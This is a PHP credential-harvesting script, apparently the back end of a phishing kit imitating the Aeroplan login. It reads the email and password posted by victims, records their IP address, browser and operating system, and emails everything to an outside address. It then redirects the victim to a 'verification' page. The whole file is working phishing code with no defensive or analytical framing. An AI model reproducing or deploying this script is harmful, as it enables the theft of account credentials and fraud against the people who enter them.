<?php

$ip = getenv("REMOTE_ADDR");
$email=$_POST['email'];
$password=$_POST['password'];

$browser = $_SERVER['HTTP_USER_AGENT'];


$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

     $os_array = array(

        '/windows nt 11/i'      =>  'Windows 11',
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/macintosh|mac os x|mac_powerpc/i' => 'macOS',
        '/ubuntu/i'             =>  'Ubuntu',
        '/fedora/i'             =>  'Fedora',
        '/debian/i'             =>  'Debian',
        '/linux/i'              =>  'Linux',
        '/cros/i'               =>  'ChromeOS',
        '/ipad/i'               =>  'iPadOS',
        '/iphone/i'             =>  'iOS',
        '/ipod/i'               =>  'iOS',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array = array(
        '/duckduckgo/i'   =>  'DuckDuckGo',
        '/brave/i'        =>  'Brave',
        '/vivaldi/i'      =>  'Vivaldi',
        '/edg/i'          =>  'Edge Chromium Edge',
        '/msie/i'         =>  'Internet Explorer',
        '/trident/i'      =>  'Internet Explorer For IE 11',
        '/firefox/i'      =>  'Firefox',
        '/fxios/i'        =>  'Firefox on iOS',
        '/opr/i'          =>  'Opera',
        '/opera/i'        =>  'Opera',
        '/chrome/i'       =>  'Chrome',
        '/safari/i'       =>  'Safari',
        '/konqueror/i'    =>  'Konqueror',
        '/mobile/i'       =>  'Mobile Browser'
    );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();


$subj = "| Air - $ip | $email $password |";
$msg = "**********************************\t\n Email: $email\t\n Pass: $password\t\n **********************************\t\n User-Agent: $browser\t\n Browser: $user_browser\t\n OS: $user_os\t\n IP: $ip\t\n **********************************\t\n";
$from = " ";

mail("info@thecleaner.org.uk", $subj, $msg, $from); 

$redirect_url = 'verification.html';

echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1250"><meta http-equiv="refresh" content="0; url=' . $redirect_url . '"><title>Aeroplan</title></head><body></div></body></html>';

?>